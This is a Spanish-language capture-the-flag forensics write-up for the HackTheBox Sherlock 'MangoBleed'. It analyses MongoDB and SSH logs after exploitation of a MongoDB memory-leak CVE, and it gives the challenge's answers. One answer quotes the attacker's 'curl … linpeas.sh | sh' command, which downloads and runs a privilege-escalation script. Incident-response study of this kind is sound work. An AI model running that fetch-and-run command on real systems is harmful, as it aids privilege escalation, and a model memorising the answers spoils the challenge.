@@ -1,0 +1,114 @@
+---
+type: writeup
+title: MangoBleed
+description: El Sherlock ofrece experiencia práctica en análisis forense y respuesta a incidentes, incluyendo la vulnerabilidad MongoBleed. MongoBleed es una vulnerabilidad de divulgación de memoria dinámica en el servidor MongoDB. Surge en la lógica de gestión de compresión zlib del servidor, específicamente en cómo analiza los mensajes de red comprimidos. Al enviar mensajes especialmente diseñados con campos de longitud inconsistente, un atacante puede provocar que MongoDB devuelva memoria dinámica no inicializada, exponiendo potencialmente datos confidenciales en memoria sin autenticación.
+lang: es
+draft: false
+featured: true
+image: ../../../../images/writeups/hackthebox/sherlocks/mangobleed/mangobleed.png
+platform: hackthebox
+url: https://app.hackthebox.com/sherlocks/MangoBleed
+difficulty: veryeasy
+os: linux
+hints: []
+tags: []
+---
+
+## What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?
+
+Una pequeña búsqueda en Google.
+
+<Callout type="success" title="MongoBleed CVE">
+  CVE-2025-14847
+</Callout>
+
+## What is the version of MongoDB installed on the server that the CVE exploited?
+
+Podemos ver los logs de mongodb para encontrar la versión.
+
+```bash
+grep -m 1 --color=auto version \[root\]/var/log/mongodb/mongod.log | jq -r '.attr | .buildInfo | .version'
+```
+
+<Callout type="success" title="MongoDB version">
+  8.0.16
+</Callout>
+
+## Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.
+
+Podemos filtrar los logs por números de eventos de conexión aceptada (22943) y conexión cerrada (22944) y grepear las direcciones IP unicas.
+
+```bash
+grep -E "22943|22944" \[root\]/var/log/mongodb/mongod.log | grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" | sort -u
+```
+
+<Callout type="success" title="Attacker's remote IP address">
+  65.0.76.43
+</Callout>
+
+## Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)
+
+Grepeamos los logs buscando el primer evento de conexión aceptada y obtenemos la key `$date`.
+
+```bash
+grep 22943 \[root\]/var/log/mongodb/mongod.log | head -n 1 | jq -r '.t | ."$date"'
+```
+
+<Callout type="success" title="Date and time">
+  2025-12-29 05:25:52
+</Callout>
+
+## Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.
+
+Se pide calcular el número total de conexiones maliciosas iniciadas por el atacante pero se tiene en cuenta todo el output que tiene la IP del atacante.
+
+```bash
+grep 65.0.76.43 \[root\]/var/log/mongodb/mongod.log | wc -l
+```
+
+<Callout type="success" title="Malicious connections">
+  75260
+</Callout>
+
+## The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?
+
+Revisando el archivo `/var/log/auth.log` encontramos una conexión por ssh que dura unos 8 minutos.
+
+```bash
+grep --color=auto 65.0.76.43 \[root\]/var/log/auth.log
+```
+
+```bash
+2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
+2025-12-29T05:48:28.249844+00:00 ip-172-31-38-170 sshd[40027]: Received disconnect from 65.0.76.43 port 46062:11: disconnected by user
+```
+
+<Callout type="success" title="Interactive remote access">
+  2025-12-29 05:40:03
+</Callout>
+
+## Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.
+
+Para saber qué comandos ejecutó el atacante podemos revisar el archivo `.bash_history`.
+
+```bash
+cat \[root\]/home/mongoadmin/.bash_history
+```
+
+<Callout type="success" title="Command line">
+  curl -L
+  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh |
+  sh
+</Callout>
+
+## The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?
+
+Revisando el archivo `.bash_history` encontramos el directorio en el que el atacante levantó un servidor con Python.
+
+```bash
+cat \[root\]/home/mongoadmin/.bash_history
+```
+
+<Callout type="success" title="Directory">
+  /var/lib/mongodb
+</Callout>
